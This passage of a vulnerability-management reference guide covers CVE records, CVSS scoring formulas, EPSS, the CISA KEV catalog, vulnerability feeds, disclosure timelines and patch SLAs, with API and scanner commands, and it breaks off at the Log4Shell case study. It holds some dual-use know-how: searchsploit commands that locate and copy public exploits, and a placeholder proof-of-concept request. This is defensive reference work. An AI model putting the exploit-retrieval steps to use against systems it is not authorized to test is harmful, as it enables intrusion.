# CVE Reference Guide

> Reference for the CVE program, CVSS scoring, EPSS, KEV catalog,
> vulnerability databases, research, patch management, notable CVEs, and automation tooling.

<!-- meta:start (written by scripts/build_doc_meta.py from data/doc_meta.yaml; do not edit) -->

<table class="tsw-meta-card">
<tr><th scope="row" align="left" valign="top">Who this is for</th><td>

Vulnerability analysts, patch managers, and engineers automating CVE enrichment

</td></tr>
<tr><th scope="row" align="left" valign="top">Level</th><td>

Intermediate

</td></tr>
<tr><th scope="row" align="left" valign="top">Reading time</th><td>

About 20 min (4,619 words at 230 words a minute)

</td></tr>
<tr><th scope="row" align="left" valign="top">Read this when</th><td>

You are deciding which vulnerabilities to patch first, you are scoring a new CVE with CVSS v3.1 or v4.0, or you are building automated CVE/EPSS/KEV enrichment pipelines

</td></tr>
<tr><th scope="row" align="left" valign="top">Start at</th><td>

[CVSS v3.1 Deep Dive](#_2-cvss-v31-deep-dive), [EPSS: Exploit Prediction Scoring System](#_4-epss-exploit-prediction-scoring-system), [CISA KEV Catalog](#_5-cisa-kev-catalog)

</td></tr>
</table>

<details class="tsw-meta-more"><summary>More about this page (pairs with, last corrected, last reviewed)</summary>

<table class="tsw-meta-card">
<tr><th scope="row" align="left" valign="top">Pairs with</th><td>

[CWE Reference](CWE_REFERENCE.md), [CTEM Reference](CTEM_REFERENCE.md), [Fuzzing & Vulnerability Research](FUZZING_VULNERABILITY_RESEARCH.md), [Exploit Development Reference](EXPLOIT_DEVELOPMENT_REFERENCE.md)

</td></tr>
<tr><th scope="row" align="left" valign="top">Last corrected</th><td>

2026-10-01, BOD 22-01 paragraph rewritten for BOD 26-04 ([#63](https://github.com/TeamStarWolf/TeamStarWolf/pull/63))

</td></tr>
<tr><th scope="row" align="left" valign="top">Last reviewed</th><td>

No review recorded yet

</td></tr>
</table>

</details>

<details class="tsw-meta-which"><summary>Which page should I read? This page is one of 4 on vulnerability prioritization and management.</summary>

| Page | Read it for |
|---|---|
| CVE Reference (this page) | The scoring mechanics: CVE records, CVSS, EPSS, and the KEV catalog, with automation code. |
| [Vulnerability Prioritization Reference](/VULNERABILITY_PRIORITIZATION_REFERENCE.md) | The decision layer: which signal outranks which (SSVC, KEV, EPSS) and how the result becomes an SLA. |
| [Vulnerability Management](/VULNERABILITY_MANAGEMENT_REFERENCE.md) | Operational tooling: scanners, DefectDojo, SCA and SBOM, and patching. |
| [CTEM Reference](/CTEM_REFERENCE.md) | The program loop prioritization runs inside: scoping, discovery, prioritization, validation, and mobilization. |

</details>

<!-- meta:end -->

---

## Table of Contents
1. [CVE Program & NVD Architecture](#_1-cve-program-amp-nvd-architecture)
2. [CVSS v3.1 Deep Dive](#_2-cvss-v31-deep-dive)
3. [CVSS v4.0](#_3-cvss-v40)
4. [EPSS: Exploit Prediction Scoring System](#_4-epss-exploit-prediction-scoring-system)
5. [CISA KEV Catalog](#_5-cisa-kev-catalog)
6. [Vulnerability Databases & Feeds](#_6-vulnerability-databases-amp-feeds)
7. [Vulnerability Research & Disclosure](#_7-vulnerability-research-amp-disclosure)
8. [Patch Management & Remediation](#_8-patch-management-amp-remediation)
9. [Notable CVEs & Case Studies](#_9-notable-cves-amp-case-studies)
10. [CVE Automation & Tooling](#_10-cve-automation-amp-tooling)

---

## 1. CVE Program & NVD Architecture

### History & Scale
The Common Vulnerabilities and Exposures (CVE) program was established in 1999
by MITRE Corporation with initial funding from DARPA/NSF, now operated under
CISA. The initial list had 321 entries; as of 2024 the program has published
over 240,000+ CVE records growing at ~25,000-30,000 new CVEs per year.
CVE provides a standardized identifier allowing security tools, databases, and
researchers to reference the same vulnerability unambiguously.

### CNA Hierarchy
The CVE Numbering Authority (CNA) ecosystem is a federated hierarchy:

MITRE (Root CNA): ultimate authority; assigns CVEs when no other CNA
covers the scope; operates cve.mitre.org and the CVE Services API.

Top-Level Root CNAs (TL-Root):
- CISA-ADP: U.S. government systems; Authorized Data Publisher for SSVC enrichment
- GitHub: GitHub-hosted open source projects and ecosystems
- Microsoft: all Microsoft products, Azure, Microsoft 365
- Google: Google/Alphabet products, Android, ChromeOS, Chrome
- Red Hat: RHEL, Fedora, CentOS Stream, OpenShift
- Apple: macOS, iOS, iPadOS, watchOS, tvOS, Safari, XNU kernel
- Oracle: Oracle Database, Java SE/JDK, MySQL, WebLogic
- Cisco: Cisco IOS, NX-OS, ASA, network hardware, Webex

CNA-LR (CNA of Last Resort). MITRE fills gaps for products outside any
CNA scope: novel products, independent researchers, EOL software.

Authorized Data Publishers (ADP): not CNAs; authorized to add enrichment
to existing CVE records. CISA-ADP adds SSVC decision-point data and
exploitation status; other ADPs add CPE/CVSS data.

### CVE ID Format
- Pre-2014: CVE-YYYY-NNNN (4-digit, max 9,999/year)
- 2014+: CVE-YYYY-NNNNN+ (5+ digits, no upper limit)
- Examples: CVE-2014-0160 (Heartbleed), CVE-2021-44228 (Log4Shell),
  CVE-2023-34362 (MOVEit)

### CVE JSON 5.0 Record Schema

    {
      "dataType": "CVE_RECORD",
      "dataVersion": "5.0",
      "cveMetadata": {
        "cveId": "CVE-2021-44228",
        "assignerOrgId": "48a46321-0116-415e-a4a0-7728ba3167d3",
        "state": "PUBLISHED",
        "datePublished": "2021-12-10T00:00:00",
        "dateReserved": "2021-11-26T00:00:00"
      },
      "containers": {
        "cna": {
          "descriptions": [{"lang":"en","value":"Apache Log4j2 2.0-beta9..."}],
          "affected": [{
            "vendor": "Apache Software Foundation",
            "product": "Apache Log4j2",
            "versions": [{"version":"2.0-beta9","lessThan":"2.15.0",
                          "status":"affected","versionType":"semver"}]
          }],
          "metrics": [{"cvssV3_1":{"vectorString":
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H","baseScore":10.0}}],
          "solutions": [{"lang":"en","value":"Upgrade to Log4j 2.15.0+"}],
          "credits": [{"lang":"en","value":"Chen Zhaojun, Alibaba Cloud Security"}]
        },
        "adp": [{
          "providerMetadata": {"shortName": "CISA-ADP"},
          "metrics": [{"other":{"type":"ssvc","content":{
            "exploitation":"active","automatable":"yes"}}}]
        }]
      }
    }

### CVE States
- RESERVED: ID assigned; details embargoed while patch is developed
- PUBLISHED: full details public in NVD/CVE.org (description, versions, CVSS)
- REJECTED: duplicate or erroneous; record retained with rejection note

### NVD Enrichment Pipeline
NVD (nvd.nist.gov) independently adds to each published CVE record:
1. CVSS Scoring: v2.0, v3.1, and increasingly v4.0 base scores
2. CPE Matching: e.g. `cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*`
3. CWE Mapping: weakness taxonomy classification
4. Keyword Indexing: full-text search
5. ADP Enrichment: CISA-ADP SSVC data (exploitation/automatable/technicalImpact)

### CNA Workflow & Disclosure Timelines
1. Researcher finds bug, contacts vendor (security@vendor.com or bug bounty platform)
2. CNA reserves CVE ID (state: RESERVED)
3. Vendor develops + tests patch (typically 60-120 days)
4. Coordinated disclosure: patch + CVE published simultaneously
5. CVE record updated with full technical details

| Organization | Default Window | Notes |
|---|---|---|
| Google Project Zero | 90 days | +14-day grace if patch imminent |
| ZDI | 120 days | Pays at acquisition |
| CERT/CC | 45 days | Flexible for multi-vendor |
| ISO/IEC 29147 | 90 days | Mutual agreement allowed |

---

## 2. CVSS v3.1 Deep Dive

### Base Metric Weights

| Metric | Value | Weight |
|--------|-------|--------|
| Attack Vector | Network | 0.85 |
| | Adjacent | 0.62 |
| | Local | 0.55 |
| | Physical | 0.20 |
| Attack Complexity | Low | 0.77 |
| | High | 0.44 |
| Privileges Required | None | 0.85 |
| | Low (S:U) | 0.62 |
| | Low (S:C) | 0.50 |
| | High (S:U) | 0.27 |
| | High (S:C) | 0.50 |
| User Interaction | None | 0.85 |
| | Required | 0.62 |
| CIA Impact | None | 0.00 |
| | Low | 0.22 |
| | High | 0.56 |

Scope (S):
- Unchanged (U): exploited and impacted component are the same
- Changed (C): exploitation causes impact on a different component/authority
  (VM escape, browser sandbox escape, SSRF to metadata service)

### CVSS v3.1 Base Score Formula

    ISS = 1 - [(1-C_I) * (1-I_I) * (1-A_I)]

    If Scope=Unchanged:  Impact = 6.42 * ISS
    If Scope=Changed:    Impact = 7.52*[ISS-0.029] - 3.25*[ISS-0.02]^15

    Exploitability = 8.22 * AV * AC * PR * UI

    BaseScore = 0.0                           if Impact <= 0
    BaseScore = Roundup(Min(Impact+Exploit,10)) otherwise

    Roundup: round to 1 decimal, always round up (9.31 -> 9.4)

### Temporal Metrics (modify base score downward)

    TemporalScore = Roundup(BaseScore * E * RL * RC)

Exploit Code Maturity (E):
- Not Defined (X): 1.00 | Unproven (U): 0.91 | Proof-of-Concept (P): 0.94
- Functional (F): 0.97 | High (H): 1.00

Remediation Level (RL):
- Not Defined (X): 1.00 | Official Fix (O): 0.95 | Temporary Fix (T): 0.96
- Workaround (W): 0.97 | Unavailable (U): 1.00

Report Confidence (RC):
- Not Defined (X): 1.00 | Unknown (U): 0.92 | Reasonable (R): 0.96
- Confirmed (C): 1.00

### Environmental Metrics
Modified Base Metrics (MAV, MAC, MPR, MUI, MS, MC, MI, MA) override base values
for local environment context; default "Not Defined" inherits base value.

CR/IR/AR (Requirement modifiers): Low 0.50 | Medium 1.00 | High 1.50

### Worked Example: CVE-2021-44228 Log4Shell

    AV:N  -- network-exploitable via any HTTP/TCP connection
    AC:L  -- no special conditions; exploit is deterministic
    PR:N  -- unauthenticated; attacker controls any logged string
    UI:N  -- no victim action; server processes requests automatically
    S:C   -- JNDI loads attacker class in JVM; scope change
    C:H   -- RCE = complete confidentiality loss
    I:H   -- RCE = arbitrary writes/modification
    A:H   -- RCE = service disruption

    Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    Base Score: 10.0 CRITICAL

### Severity Ranges

| Severity | Score Range | Typical SLA |
|----------|-------------|-------------|
| None | 0.0 | N/A |
| Low | 0.1 - 3.9 | 180 days |
| Medium | 4.0 - 6.9 | 90 days |
| High | 7.0 - 8.9 | 30 days |
| Critical | 9.0 - 10.0 | 14 days |

---

## 3. CVSS v4.0

Officially published by FIRST on November 1, 2023 (previewed June 2023 at the 35th FIRST Conference; two rounds of public comment followed). Significant structural changes from v3.1.

### Score Nomenclature

| Label | Components | Use Case |
|-------|-----------|---------|
| CVSS-B | Base only | Vendor advisories |
| CVSS-BT | Base + Threat | Current exploitation state |
| CVSS-BE | Base + Environmental | Org-specific risk |
| CVSS-BTE | Base + Threat + Environmental | Full current org risk |

### New and Changed Base Metrics

Attack Requirements (AT), NEW: environmental prerequisites beyond attacker control
- None (N): no special deployment conditions required
- Present (P): specific config/deployment condition required

User Interaction (UI), expanded from binary:
- None (N): no user involvement
- Passive (P): user takes routine action (opens email, visits page)
- Active (A): user must take deliberate non-routine action (open file, install package)

Scope removed, replaced by two-system impact model:

| Metric | Description |
|--------|-------------|
| VC/VI/VA | Vulnerable System CIA (directly exploited) |
| SC/SI/SA | Subsequent System CIA (other systems affected) |

Each: None / Low / High

### Supplemental Metrics (informational only: do not affect score)

| Metric | Values | Purpose |
|--------|--------|---------|
| Safety (S) | Not Defined / Negligible / Present | Life/physical safety (OT/ICS) |
| Automatable (AU) | No / Yes | Wormability check |
| Recovery (R) | Automatic / User / Irrecoverable | Post-exploit recovery |
| Value Density (V) | Diffuse / Concentrated | Resource richness of target |
| Response Effort (RE) | Low / Moderate / High | Defender effort to remediate |
| Provider Urgency (U) | Red / Amber / Green / Clear | Vendor urgency signal |

### Threat Metric (replaces Temporal E)
- Not Defined (X): 1.00 | Unreported (U): 0.91
- Proof-of-Concept (P): 0.94 | Attacked (A): 1.00

### v3.1 vs v4.0 Comparison

| Dimension | v3.1 | v4.0 |
|-----------|------|------|
| Scope metric | Changed/Unchanged | Removed |
| Impact model | Single system | VS + SS two-system |
| OT/ICS | Limited | Safety supplemental |
| UI values | None/Required | None/Passive/Active |
| Exploit metric | Exploit Code Maturity | Threat |
| Comparability | N/A | NOT comparable to v3.1 |

Calculator: https://www.first.org/cvss/calculator/4-0

### CVSS v4.0 Example: CVE-2023-4966 CitrixBleed

    AV:N / AC:L / AT:N / PR:N / UI:N
    VC:H / VI:N / VA:N          (session tokens leaked from NetScaler memory)
    SC:H / SI:H / SA:N          (full access to downstream authenticated systems)
    CVSS-B: 9.4 CRITICAL
    Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:N

---

## 4. EPSS: Exploit Prediction Scoring System

### What EPSS Measures
EPSS (maintained by FIRST) answers: "What is the probability this CVE will
be exploited in the wild in the next 30 days?"

- Score: 0.000001 to 1.0 (probability)
- Updated daily at api.first.org
- EPSS v5 (current: model version v2026.06.15, live since June 15, 2026): released by Empirical Security, which reports a 23% improvement over v4 on the same data ([EPSS V5 Is Here](https://research.empiricalsecurity.com/research/epss-v5-is-here)). The daily scores file names the model in its header (`model_version:v2026.06.15`).
- EPSS v4 (March 2025, superseded by v5): developed by Jay Jacobs / Empirical Security with the Cyentia Institute, published by FIRST. Vastly improved data ingestion and monitoring; expands exploitation tracking to malware activity + endpoint detections (~12K vulnerabilities/month). Not directly comparable to v3.
- EPSS v3 (Feb 2023, superseded): ~1,500 features; accuracy degraded slightly over 2023-2024, prompting v4

### EPSS Model Features (v3 signals, expanded in v4)
- NVD metadata: CVSS score, CWE, CPE vendor/product
- Reference patterns: exploit-db.com URL = strong positive signal
- Exploit-DB listing and Metasploit module existence
- Social media velocity: Twitter/X, Reddit, security blogs
- Dark web signals: exploit marketplace listings
- Threat intelligence: honeypot exploitation data
- CVE age and patch availability

### API Usage

    # Single CVE
    curl "https://api.first.org/data/v1/epss?cve=CVE-2021-44228"
    # Response: {"data":[{"cve":"CVE-2021-44228","epss":"0.97565","percentile":"0.99998"}]}

    # Bulk (up to 100 CVEs)
    curl "https://api.first.org/data/v1/epss?cve=CVE-2021-44228,CVE-2023-34362"

    # Filter: all CVEs with EPSS > 0.70 today
    curl "https://api.first.org/data/v1/epss?epss-gt=0.70&order=!epss&limit=100"

Python bulk query:

    import requests
    def get_epss(cve_list):
        out = {}
        for i in range(0, len(cve_list), 100):
            batch = ",".join(cve_list[i:i+100])
            r = requests.get(f"https://api.first.org/data/v1/epss?cve={batch}")
            for e in r.json().get("data", []):
                out[e["cve"]] = {"epss": float(e["epss"]),
                                 "pct": float(e["percentile"])}
        return out

### Score Interpretation

Only 5-7% of all published CVEs are ever exploited. EPSS identifies which.

| EPSS Score | Interpretation | Action |
|------------|---------------|----|
| > 0.70 | Top ~3%; very high probability | Emergency (24-72h) |
| 0.10-0.70 | Top 20-30%; elevated risk | Accelerate (14 days) |
| 0.01-0.10 | Moderate baseline | Normal cycle |
| < 0.01 | Low (majority of CVEs) | Deprioritize |

### EPSS + CVSS Combined Matrix

| CVSS | EPSS > 0.70 | EPSS 0.10-0.70 | EPSS < 0.10 |
|------|-------------|----------------|-------------|
| Critical/High | Emergency 24-72h | High: 14 days | Normal: 30 days |
| Medium | High: 14 days | Normal: 60 days | Low: 90 days |
| Low | Monitor | Deprioritize | Deprioritize |

### EPSS Limitations
- New CVEs lack exploitation history; may underestimate targeted 0-days
- Novel attack classes not in training data are underweighted
- Nation-state targeting of specific organizations not captured
- Population-level metric; does not account for your asset exposure
- v1/v2/v3 scores are not directly comparable across model versions

---

## 5. CISA KEV Catalog

### Legal Authority
BOD 26-04 (June 10, 2026): Federal Civilian Executive Branch (FCEB)
agencies must remediate KEV entries within risk-based deadlines (from 3 days
with mandatory forensic triage down to fix-on-upgrade, set by four risk
factors). It superseded and revoked BOD 22-01 (November 3, 2021), which
had set a flat per-entry deadline (typically 14 days); the KEV catalog and its
criteria carry forward. CISA recommends all organizations use KEV for prioritization.

### KEV Entry Criteria
ALL THREE must be met for a CVE to enter KEV:
1. Valid CVE ID assigned
2. Reliable evidence of active exploitation in the wild (not just PoC)
3. Clear remediation guidance available (vendor patch or official mitigation)

### KEV JSON Feed

    # Download (updated daily)
    curl -O https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json

Feed structure:

    {
      "title": "CISA Known Exploited Vulnerabilities Catalog",
      "catalogVersion": "2024.01.15",
      "count": 1112,
      "vulnerabilities": [
        {
          "cveID": "CVE-2021-44228",
          "vendorProject": "Apache",
          "product": "Log4j2",
          "vulnerabilityName": "Apache Log4j2 Remote Code Execution Vulnerability",
          "dateAdded": "2021-12-10",
          "requiredAction": "Apply updates per vendor instructions.",
          "dueDate": "2021-12-24",
          "knownRansomwareUse": "Known"
        }
      ]
    }

### Python KEV Parser

    import requests
    from collections import Counter
    from datetime import datetime, timedelta

    def kev_check(asset_cves: set) -> list:
        data = requests.get(
            "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
        ).json()
        vulns = data["vulnerabilities"]

        # Stats
        print(f"Total KEV: {len(vulns)}")
        print(f"Ransomware-associated: {sum(1 for v in vulns if v.get('knownRansomwareUse')=='Known')}")
        vendors = Counter(v["vendorProject"] for v in vulns)
        print("Top vendors:", vendors.most_common(5))

        # Cross-reference with asset CVEs
        matches = [v for v in vulns if v["cveID"] in asset_cves]
        for m in matches:
            print(f"EMERGENCY: {m['cveID']} due {m['dueDate']} | {m['requiredAction']}")
        return matches

### KEV Catalog Statistics (2024)
- Total entries: ~1,100+ (growing ~15-20/month)
- Top vendors: Microsoft, Cisco, Apple, Google, Adobe, Ivanti, Fortinet, VMware
- Ransomware-associated: ~30% of all entries
- Oldest entries: early 2000s legacy CVEs still actively exploited

### Prioritization Tier Model
1. CISA KEV: confirmed exploitation; mandatory for FCEB (14-day SLA)
2. EPSS > 0.70: very likely to be exploited; treat as pre-KEV
3. CVSS Critical (9.0+): high theoretical impact
4. CVSS High (7.0-8.9): significant impact
5. Medium/Low: standard cycle

---

## 6. Vulnerability Databases & Feeds

### NVD REST API v2.0

Base URL: `https://services.nvd.nist.gov/rest/json/cves/2.0`

    # Single CVE lookup
    curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228"

    # Incremental sync (last 24h modifications)
    curl "...?lastModStartDate=2024-01-01T00:00:00.000&lastModEndDate=2024-01-02T00:00:00.000"

    # Filter by severity
    curl "...?cvssV3Severity=CRITICAL&resultsPerPage=100"

    # CPE-based product search
    curl "...?cpeName=cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*"

    # Pagination (max 2,000/page)
    curl "...?cvssV3Severity=CRITICAL&startIndex=200&resultsPerPage=100"

Rate limits: 6 req/30s without API key; higher with free key from nvd.nist.gov/developers.

Python sync client (abbreviated):

    import requests, time, sqlite3, json
    from datetime import datetime, timedelta

    class NVDClient:
        BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        def __init__(self, api_key=None):
            self.headers = {"apiKey": api_key} if api_key else {}
            self.delay = 0.6 if api_key else 6.0
        def _get(self, params):
            time.sleep(self.delay)
            return requests.get(self.BASE, params=params,
                                headers=self.headers, timeout=30).json()
        def sync_range(self, start, end):
            params = {"lastModStartDate": start.strftime("%Y-%m-%dT%H:%M:%S.000"),
                      "lastModEndDate":   end.strftime("%Y-%m-%dT%H:%M:%S.000"),
                      "resultsPerPage": 2000}
            count = 0
            while True:
                params["startIndex"] = count
                data = self._get(params)
                vulns = data.get("vulnerabilities", [])
                count += len(vulns)
                if count >= data.get("totalResults", 0):
                    break
            return count

### OSV (osv.dev)
Open source focused; git-commit-level affected version ranges.

OSV JSON key fields:

    {
      "id": "GHSA-jfh8-c2jp-hdp8",
      "aliases": ["CVE-2022-31197"],
      "affected": [{
        "package": {"ecosystem": "Maven", "name": "org.postgresql:postgresql"},
        "ranges": [
          {"type": "ECOSYSTEM", "events": [{"introduced":"42.2.0"},{"fixed":"42.2.26"}]},
          {"type": "GIT", "repo": "https://github.com/pgjdbc/pgjdbc",
           "events": [{"introduced":"badc9814"},{"fixed":"739e599d"}]}
        ]
      }]
    }

OSV Scanner CLI:

    osv-scanner --lockfile=package-lock.json --json
    osv-scanner -r /path/to/project --json
    osv-scanner --sbom=sbom.cdx.json --json
    osv-scanner --docker nginx:latest

Supported ecosystems: Go, npm, PyPI, crates.io, RubyGems, NuGet, Maven,
Packagist, Hex, Pub, Alpine, Debian, Ubuntu, Rocky Linux

### GitHub Security Advisories (GHSA)
Format: GHSA-xxxx-xxxx-xxxx. Powers Dependabot; ecosystem-native version ranges.

GraphQL:

    query {
      securityAdvisory(ghsaId: "GHSA-jfh8-c2jp-hdp8") {
        severity
        cvss { score vectorString }
        cwes(first:5) { nodes { cweId name } }
        vulnerabilities(first:10) {
          nodes {
            package { name ecosystem }
            vulnerableVersionRange
            firstPatchedVersion { identifier }
          }
        }
      }
    }

### Exploit-DB / searchsploit

    searchsploit apache 2.4               # Search by product/version
    searchsploit --id CVE-2021-41773      # Search by CVE ID
    searchsploit -m 50383                 # Copy exploit to current dir
    searchsploit --nmap scan.xml          # Check Nmap output against Exploit-DB
    searchsploit -u                       # Update local database

### CWE Top 25 Most Dangerous (2025)

Released by CISA and MITRE on December 11, 2025 (analysis of ~39,000 CVEs disclosed June 2024-June 2025). The ranking shifted markedly from 2023: XSS rose to #1, CSRF and Missing Authorization entered the top 4, and hardcoded credentials (CWE-798), integer overflow (CWE-190), and improper authentication (CWE-287) dropped out of the Top 25.

| Rank | CWE-ID | Name |
|------|--------|------|
| 1 | CWE-79 | Cross-site Scripting (XSS) |
| 2 | CWE-89 | SQL Injection |
| 3 | CWE-352 | Cross-Site Request Forgery (CSRF) |
| 4 | CWE-862 | Missing Authorization |
| 5 | CWE-787 | Out-of-bounds Write |
| 6 | CWE-22 | Path Traversal |
| 7 | CWE-416 | Use After Free |
| 8 | CWE-125 | Out-of-bounds Read |
| 9 | CWE-78 | OS Command Injection |
| 10 | CWE-94 | Code Injection |
| 11 | CWE-120 | Classic Buffer Overflow |
| 12 | CWE-434 | Unrestricted File Upload |
| 13 | CWE-476 | NULL Pointer Dereference |
| 14 | CWE-121 | Stack-based Buffer Overflow |
| 15 | CWE-502 | Deserialization of Untrusted Data |
| 16 | CWE-122 | Heap-based Buffer Overflow |
| 17 | CWE-863 | Incorrect Authorization |
| 18 | CWE-20 | Improper Input Validation |
| 19 | CWE-284 | Improper Access Control |
| 20 | CWE-200 | Exposure of Sensitive Information |
| 21 | CWE-306 | Missing Authentication for Critical Function |
| 22 | CWE-918 | Server-Side Request Forgery (SSRF) |
| 23 | CWE-77 | Command Injection |
| 24 | CWE-639 | Authorization Bypass Through User-Controlled Key |
| 25 | CWE-770 | Allocation of Resources Without Limits |

_Prior edition (2023 Top 25, for crosswalk): #1 CWE-787, #2 CWE-79, #3 CWE-89, #4 CWE-416, #5 CWE-78, #6 CWE-20, #7 CWE-125, #8 CWE-22, #9 CWE-352, #10 CWE-434, #11 CWE-502, #12 CWE-306, #13 CWE-190, #14 CWE-476, #15 CWE-798._

### Vendor Advisory Feeds

    # Microsoft MSRC (Patch Tuesday -- 2nd Tuesday monthly)
    curl "https://api.msrc.microsoft.com/cvrf/v2.0/updates"
    curl "https://api.msrc.microsoft.com/cvrf/v2.0/cvrf/id/2024-Jan"

    # Red Hat OVAL (automated patch status)
    curl -O https://www.redhat.com/security/data/oval/com.redhat.rhsa-RHEL9.xml.bz2
    bunzip2 com.redhat.rhsa-RHEL9.xml.bz2
    oscap oval eval --results results.xml com.redhat.rhsa-RHEL9.xml

    # Cisco PSIRT RSS
    curl "https://tools.cisco.com/security/center/rss.xml"

---

## 7. Vulnerability Research & Disclosure

### Finding Vulnerabilities

Fuzzing:

    # AFL++ -- coverage-guided greybox fuzzer
    afl-fuzz -i corpus/ -o findings/ -- ./target @@
    # @@: replaced with mutated input file path
    # Persistent mode: use __AFL_LOOP() macro + afl-clang-fast (100x faster)

    # libFuzzer -- compiler-integrated (for library functions)
    clang -g -O1 -fsanitize=fuzzer,address -o fuzz_target fuzz_target.c
    ./fuzz_target -max_total_time=3600 -jobs=4 corpus/

    # OSS-Fuzz: Google's continuous fuzzing for 1000+ open source projects
    # Submit via https://github.com/google/oss-fuzz for free 24/7 fuzzing

Static Analysis / CodeQL:

    # Create database
    codeql database create mydb --language=javascript --source-root=./src

    # Run security queries
    codeql database analyze mydb codeql/javascript-queries:Security/       --format=sarif-latest --output=results.sarif

Memory Safety Sanitizers:

    clang -fsanitize=address,undefined -g -O1 -o target target.c
    # ASan: buffer overflows, use-after-free, double-free
    # UBSan: integer overflow, null pointer dereference, misaligned access

    clang -fsanitize=memory -g -O1 -o target target.c
    # MSan: uninitialized reads

    valgrind --leak-check=full --track-origins=yes ./target  # no recompile needed

Patch Diffing (N-day research):

    # Open source: find security commits
    git log --oneline --no-merges -- '*.c' | grep -i "fix\|vuln\|secur"
    git diff VULN_COMMIT..PATCH_COMMIT

    # Binary: BinDiff (Ghidra/IDA plugin)
    # Export BinExport from old+new binary -> compare in BinDiff

### Responsible Disclosure

Find vendor contact:

    curl https://target.com/.well-known/security.txt  # RFC 9116 standard
    # Try: security@, psirt@, vulnerability@vendor.com
    # Check HackerOne/Bugcrowd program directories

Disclosure timelines:

| Organization | Window | Notes |
|---|---|---|
| Google Project Zero | 90 days | +14-day grace |
| ZDI | 120 days | Pays bounty at acquisition |
| CERT/CC | 45 days | Multi-vendor coordination |
| ISO/IEC 29147 | 90 days | International standard |

If vendor unresponsive:
1. Day 7: Follow-up same thread
2. Day 14: Notify escalation to CERT/CC
3. Day 21: Contact kb.cert.org/vuls/report/
4. Day 90: Publish (notify vendor 7 days before)

### Vulnerability Report Template

    Title: [Vendor] [Product] [Version] -- [CWE Class] enabling [Impact]

    CVSS v3.1: X.X [SEVERITY]
    Vector: CVSS:3.1/AV:.../...
    CWE: CWE-XXX ([Name])

    Summary: [2-3 sentences: what/where/impact]

    Proof of Concept:
    $ curl -X POST https://target/endpoint -d "param=PAYLOAD"
    Expected: [normal behavior]
    Actual: [vulnerable behavior]

    Affected: [version range; tested version]
    Environment: [OS, software versions]

    Timeline:
    YYYY-MM-DD -- Discovered
    YYYY-MM-DD -- Reported to vendor
    YYYY-MM-DD -- CVE-YYYY-NNNNN assigned
    YYYY-MM-DD -- Patch released (version X.Y.Z)

    Remediation: [upgrade to X.Y.Z / apply patch MSYY-XXXX]

### Bug Bounty Programs (2024)

| Program | Platform | Max Award |
|---------|----------|-----------|
| Apple Security | Direct | $1,000,000 (kernel/boot) |
| Microsoft MSRC | Direct/HackerOne | $250,000 |
| Google VRP | Direct | $150,000+ |
| Meta | HackerOne | $300,000 |
| GitHub | HackerOne | $50,000 |

Platforms: HackerOne, Bugcrowd, Intigriti, Synack (invite-only), YesWeHack

---

## 8. Patch Management & Remediation

### Scanner Output

Tenable Nessus:
- Plugin ID: unique check identifier
- CVSS: NVD-sourced base score
- VPR (Vulnerability Priority Rating): 0-10; combines CVSS + threat intel + asset criticality
  - VPR >= 9: patch within 24h; VPR 7-9: 7 days; VPR < 4: normal cycle

Qualys VMDR RTI Flags:
- Active_Attacks, Wormable, No_Patch, Easy_Exploit, High_Lateral_Movement, CISA_KEV

Open Source Scanners:

    # Trivy
    trivy image nginx:latest --severity CRITICAL,HIGH
    trivy image nginx:latest --format sarif --output trivy.sarif

    # Grype
    grype image:nginx --fail-on high --output json > grype.json

    # OSV-Scanner
    osv-scanner --lockfile=package-lock.json --format json

### Risk-Based Prioritization Tiers

| Tier | Condition | SLA |
|------|-----------|-----|
| T1 Emergency | CISA KEV OR active exploitation | 24-72 hours |
| T2 Critical | EPSS > 0.70 OR CVSS 9.0+ with public exploit | 14 days |
| T3 High | CVSS 7.0+ with EPSS > 0.10 | 30 days |
| T4 Medium | CVSS 4.0-6.9 | 90 days |
| T5 Low | CVSS < 4.0 | 180 days |

### Exception Management

Exception request fields:
- CVE ID and vulnerability summary (CVSS/EPSS/KEV flag)
- Affected asset inventory
- Business justification (legacy system, vendor EOL, stability risk)
- Compensating controls (network segmentation, WAF rule, IDS signature, MFA)
- Residual risk assessment (Low/Medium/High)
- Risk owner (VP or above for Critical/High)
- Exception duration and expiration date
- Revalidation schedule

Approval matrix:

| Risk Level | Approver | Max Duration |
|-----------|---------|-------------|
| Critical | CISO + Executive Sponsor | 30 days |
| High | CISO or delegate | 90 days |
| Medium | Security Manager | 180 days |
| Low | Security Analyst | 365 days |

### SCAP: Security Content Automation Protocol

- OVAL: XML-based check definitions; verify patch status without exploitation
- XCCDF: Benchmark format (DISA STIGs, CIS Benchmarks)
- CPE: Standardized product naming for software inventory matching

Commands:

    # OVAL evaluation
    oscap oval eval --results results.xml com.redhat.rhsa-RHEL9.xml

    # CIS Level 1 benchmark
    oscap xccdf eval       --profile xccdf_org.ssgproject.content_profile_cis       --results xccdf-results.xml --report xccdf-report.html       /usr/share/xml/scap/ssg/content/ssg-rhel9-xccdf.xml

### Patch Verification
1. Re-scan within 48h of remediation claim
2. Verify vulnerability absent from post-patch scan
3. Attach scan evidence to ticket
4. For KEV items: complete CISA attestation and submit to GRC

---

## 9. Notable CVEs & Case Studies

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [the CVE register](https://teamstarwolf.github.io/intelligence-hub/#/cves) · [KEV additions in the last 30 days](https://teamstarwolf.github.io/intelligence-hub/#/kev)

<!-- hub-links:end -->

### CVE-2021-44228: Log4Shell

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2021-44228 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-44228)

<!-- hub-links:end -->

Affected: Apache Log4j 2.x (2.0-beta9 through 2.14.1)
CVSS: 10.0 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
